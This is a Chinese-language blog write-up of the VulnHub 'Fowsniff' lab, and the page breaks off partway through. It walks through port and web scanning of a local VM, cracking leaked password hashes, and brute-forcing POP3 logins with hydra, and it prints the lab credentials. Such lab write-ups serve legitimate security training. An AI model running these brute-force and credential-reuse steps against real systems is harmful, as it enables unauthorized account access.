<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  Fowsniff | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  Fowsniff</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-26T02:15:01.572Z" id="date"> 2023-05-26</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-26T10:57:51.366Z" id="updated"> 2023-05-26</time></div></span><br><span>Word Count: <div class="control">6.1k</div></span><br><span>Read Time: <div class="control">32 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/ad6fe8a0424f8cb573609b763073a547379292906.jpg'><img src="/pic/ad6fe8a0424f8cb573609b763073a547379292906.jpg" alt="ad6fe8a0424f8cb573609b763073a547379292906"></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>非常好靶机，好的工作，爱来自中间的国家。</p>
<p>这台靶机主要考信息收集能力，场景设计的也很好，很真实，推荐动手尝试。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap及脚本扫描"><a href="#nmap及脚本扫描" class="headerlink" title="nmap及脚本扫描"></a>nmap及脚本扫描</h3><p>主机发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ sudo nmap -sn 192.168.56.0/24                          <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 23:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00030s latency).<br>MAC Address: 0A:00:27:00:00:08 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.100<br>Host is up (0.00014s latency).<br>MAC Address: 08:00:27:2E:A1:5A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.107<br>Host is up (0.00032s latency).<br>MAC Address: 08:00:27:B0:22:14 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 9.88 seconds<br>                                                                            <br></code></pre></td></tr></table></figure>

<p>端口扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.107<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 23:09 CST<br>Stats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 90.33% <span class="hljs-keyword">done</span>; ETC: 23:11 (0:00:11 remaining)<br>Stats: 0:03:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 99.99% <span class="hljs-keyword">done</span>; ETC: 23:12 (0:00:00 remaining)<br>Warning: 192.168.56.107 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.107<br>Host is up (0.0060s latency).<br>Not shown: 37408 filtered tcp ports (no-response), 28123 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>110/tcp open  pop3<br>143/tcp open  imap<br>MAC Address: 08:00:27:B0:22:14 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 248.28 seconds<br>                                                                            <br></code></pre></td></tr></table></figure>

<p>开了4个端口，都比较有用。就端口扫描来说看起来80是一条路，110和143是另一条路，22是最后考虑的。先看接下来的扫描再说吧。</p>
<p>TCP扫描 服务探测 OS探测</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,110,143 192.168.56.107<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 23:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.107<br>Host is up (0.00050s latency).<br><br>PORT    STATE SERVICE VERSION<br>22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 903566f4c6d295121be8cddeaa4e0323 (RSA)<br>|   256 539d236734cf0ad55a9a1174bdfdde71 (ECDSA)<br>|_  256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)<br>80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-title: Fowsniff Corp - Delivering Solutions<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>110/tcp open  pop3    Dovecot pop3d<br>|_pop3-capabilities: SASL(PLAIN) TOP CAPA USER UIDL RESP-CODES AUTH-RESP-CODE PIPELINING<br>143/tcp open  imap    Dovecot imapd<br>|_imap-capabilities: LOGIN-REFERRALS capabilities have ENABLE Pre-login IDLE listed AUTH=PLAINA0001 more post-login OK SASL-IR LITERAL+ IMAP4rev1 ID<br>MAC Address: 08:00:27:B0:22:14 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.41 seconds<br>                                                                            <br></code></pre></td></tr></table></figure>

<p>详细扫描结果发现之前的想法没问题。那我们接下来就可以先从80开始试试，可惜robots.txt里没记录什么有效信息。</p>
<p> 漏洞扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ sudo nmap --script=vuln 192.168.56.107                 <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 23:18 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.107<br>Host is up (0.00032s latency).<br>Not shown: 996 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /README.txt: Interesting, a readme.</span><br><span class="hljs-string">|_  /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>110/tcp open  pop3<br>143/tcp open  imap<br>MAC Address: 08:00:27:B0:22:14 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 334.22 seconds<br>                                                                                                           <br>┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ sudo nikto -h http://192.168.56.107   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.56.107<br>+ Target Hostname:    192.168.56.107<br>+ Target Port:        80<br>+ Start Time:         2023-05-25 23:37:26 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.18 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /images: IP address found <span class="hljs-keyword">in</span> the <span class="hljs-string">&#x27;location&#x27;</span> header. The IP is <span class="hljs-string">&quot;127.0.1.1&quot;</span>. See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed<br>+ /images: The web server may reveal its internal or real IP <span class="hljs-keyword">in</span> the Location header via a request to with HTTP/1.0. The value is <span class="hljs-string">&quot;127.0.1.1&quot;</span>. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649<br>+ /: Server may leak inodes via ETags, header found with file /, inode: a45, size: 5674fd157f6d0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418<br>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .<br>+ /images/: Directory indexing found.<br>+ /LICENSE.txt: License file found may identify site software.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/<br>+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host<br>+ End Time:           2023-05-25 23:37:50 (GMT8) (24 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>漏扫发现&#x2F;images泄露了服务器的内网ip，可惜我们暂时利用不上，其次，发现了LICENSE.txt，README.txt等文件。查看了下也没啥有用的。</p>
<h3 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h3><p>目录发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ sudo dirb http://192.168.56.107      <br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Fri May 26 10:42:11 2023<br>URL_BASE: http://192.168.56.107/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.56.107/ ----<br>==&gt; DIRECTORY: http://192.168.56.107/assets/                                   <br>==&gt; DIRECTORY: http://192.168.56.107/images/                                   <br>+ http://192.168.56.107/index.html (CODE:200|SIZE:2629)                       <br>+ http://192.168.56.107/robots.txt (CODE:200|SIZE:26)                         <br>+ http://192.168.56.107/server-status (CODE:403|SIZE:302)                     <br>                                                                              <br>---- Entering directory: http://192.168.56.107/assets/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                              <br>---- Entering directory: http://192.168.56.107/images/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                               <br>-----------------<br>END_TIME: Fri May 26 10:42:14 2023<br>DOWNLOADED: 4612 - FOUND: 3<br></code></pre></td></tr></table></figure>

<p>就这么点信息，加上之前漏扫得到的几个文件，都没啥收获。</p>
<p>看来革新派没啥收获，来点传统的。当然后台可以挂个feroxbster把一些扩展名加上防止错过一些文件。<code>sudo feroxbuster -u http://192.168.56.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301,302,401,403 -x txt,php,zip,sql,aspx,html</code></p>
<p>手动看看网页吧。</p>
<p class='item-img' data-src='/pic/assets/fows-homepage.png'><img src="/pic/assets/fows-homepage.png" alt="fows-homepage"></p>
<p>主页显示说明服务器遭受了攻击，员工的用户名密码全泄露了。主页还友情提示了我们攻击者还劫持了他们的官方推特<a target="_blank" rel="noopener" href="https://twitter.com/FowsniffCorp">@fowsniffcorp</a>，还说可能有泄漏的信息，还有这种事，那还不赶紧看看。</p>
<p>与此同时，后台挂的扫描结果出来了，发现扫出了个security.txt</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs txt"># 192.168.56.107/security.txt<br>       WHAT SECURITY?<br><br>            &#x27;&#x27;~``<br>           ( o o )<br>+-----.oooO--(_)--Oooo.------+<br>|                            |<br>|          FOWSNIFF          |<br>|            got             |<br>|           PWN3D!!!         |<br>|                            |<br>|       .oooO                |<br>|        (   )   Oooo.       |<br>+---------\ (----(   )-------+<br>           \_)    ) /<br>                 (_/<br><br><br>Fowsniff Corp got pwn3d by B1gN1nj4!<br><br><br>No one is safe from my 1337 skillz!<br></code></pre></td></tr></table></figure>

<p>看来是攻击者B1gN1nj4留下了示威的，那就看看他劫持官推有没有给我们提供什么帮助吧。</p>
<p class='item-img' data-src='/pic/assets/fowsniff-twitter.png'><img src="/pic/assets/fowsniff-twitter.png" alt="fowsniff-twitter"></p>
<p>发的第一条推就是重量级，好家伙把管理员账号和密钥md5值爆出来。那我们就看看能不能解出来吧。解出来如果B1gN1nj4没改的话不是拿下了。</p>
<p class='item-img' data-src='/pic/assets/md5-cant-crack.png'><img src="/pic/assets/md5-cant-crack.png" alt="md5-cant-crack"></p>
<p>然而没有天上掉馅饼。解不出来，系统管理员是个讲究人，密码设这么复杂搞的和真的一样。算了看看别的推文，发现置顶推文有说法。这兄弟把系统用户的密码给dump出来了，还有这种好事，赶紧看看。</p>
<p class='item-img' data-src='/pic/assets/404-not-found.png'><img src="/pic/assets/404-not-found.png" alt="404-not-found"></p>
<p>草，就给我看这个？页面上显示内容在22年8月29号被夹了。那接下来很简单了，穿越回22年8月29号前看一眼就行。</p>
<p>有能力穿回去的就不用往下看了，没能力的可以用<a target="_blank" rel="noopener" href="https://web.archive.org/">waybackmachine</a>查看以前的网页，真滴好用。</p>
<p class='item-img' data-src='/pic/assets/waybackmachine.png'><img src="/pic/assets/waybackmachine.png" alt="waybackmachine"></p>
<p>发现老哥是实在人，不仅把所有dump出来的凭证贴出来了，还告诉我们是从email服务器弄出来的。那么说明这些登录凭证很可能是用户的邮箱登录凭证。</p>
<p>二话不说先把hash丢给<a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">hashes</a>破解一下。</p>
<p class='item-img' data-src='/pic/assets/hashcrack.png'><img src="/pic/assets/hashcrack.png" alt="hashcrack"></p>
<p>除了管理员stone的其他都破解出来了，太对了哥。</p>
<h2 id="脆弱性利用"><a href="#脆弱性利用" class="headerlink" title="脆弱性利用"></a>脆弱性利用</h2><p>虽然之前收集到的是邮箱登录凭证，但是万一有人密码复用了呢？先试试ssh吧家人们。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ sudo crackmapexec ssh 192.168.56.107 -u username -p password --continue-on-success    <br></code></pre></td></tr></table></figure>

<p>然并卵。老老实实试试邮箱吧。</p>
<p>我们之前就扫描出来110和143开着，pop3以及imap服务都在正常运行。那我们就尝试登陆一下吧。</p>
<p class='item-img' data-src='/pic/assets/110-port-fonws.png'><img src="/pic/assets/110-port-fonws.png" alt="110-port-fonws">在浏览器试一下，发现并没有登录页面。而且提示的错误明显发现肯定是网页用http协议连接出问题了。</p>
<p>那就在bash里试试吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ telnet 192.168.56.107 110<br>Trying 192.168.56.107...<br>Connected to 192.168.56.107.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>+OK Welcome to the Fowsniff Corporate Mail Server!<br>user mauer <br>+OK<br>pass carp4ever<br>-ERR [AUTH] Authentication failed.<br>us-ERR Disconnected <span class="hljs-keyword">for</span> inactivity.<br>Connection closed by foreign host.<br></code></pre></td></tr></table></figure>

<p>在bash里试了试发现能连接上，没啥问题，然而一个个手动输密码还要加上协议命令真有点折磨人吧。真得直接hydra爆破。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ hydra -L username -P password -s 110 192.168.56.107 pop3<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-26 00:46:04<br>[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 80 login tries (l:10/p:8), ~5 tries per task<br>[DATA] attacking pop3://192.168.56.107:110/<br>[110][pop3] host: 192.168.56.107   login: seina   password: scoobydoo2<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-26 00:46<br></code></pre></td></tr></table></figure>

<p>发现有小可爱没改密码，给我们留下了方便之门。那就登上去看看邮件吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ sudo telnet 192.168.56.107 110<br>Trying 192.168.56.107...<br>Connected to 192.168.56.107.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>+OK Welcome to the Fowsniff Corporate Mail Server!<br>user seina<br>+OK<br>pass scoobydoo2<br>+OK Logged <span class="hljs-keyword">in</span>.<br><span class="hljs-built_in">stat</span><br>+OK 2 2902<br>list<br>+OK 2 messages:<br>1 1622<br>2 1280<br>.<br><br>retr 1<br>+OK 1622 octets<br>Return-Path: &lt;stone@fowsniff&gt;<br>X-Original-To: seina@fowsniff<br>Delivered-To: seina@fowsniff<br>Received: by fowsniff (Postfix, from userid 1000)<br>        <span class="hljs-built_in">id</span> 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)<br>To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,<br>    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,<br>    tegel@fowsniff<br>Subject: URGENT! Security EVENT!<br>Message-Id: &lt;20180313185107.0FA3916A@fowsniff&gt;<br>Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)<br>From: stone@fowsniff (stone)<br><br>Dear All,<br><br>A few days ago, a malicious actor was able to gain entry to<br>our internal email systems. The attacker was able to exploit<br>incorrectly filtered escape characters within our SQL database<br>to access our login credentials. Both the SQL and authentication<br>system used legacy methods that had not been updated <span class="hljs-keyword">in</span> some time.<br><br>We have been instructed to perform a complete internal system<br>overhaul. While the main systems are <span class="hljs-string">&quot;in the shop,&quot;</span> we have<br>moved to this isolated, temporary server that has minimal<br>functionality.<br><br>This server is capable of sending and receiving emails, but only<br>locally. That means you can only send emails to other <span class="hljs-built_in">users</span>, not<br>to the world wide web. You can, however, access this system via <br>the SSH protocol.<br><br>The temporary password <span class="hljs-keyword">for</span> SSH is <span 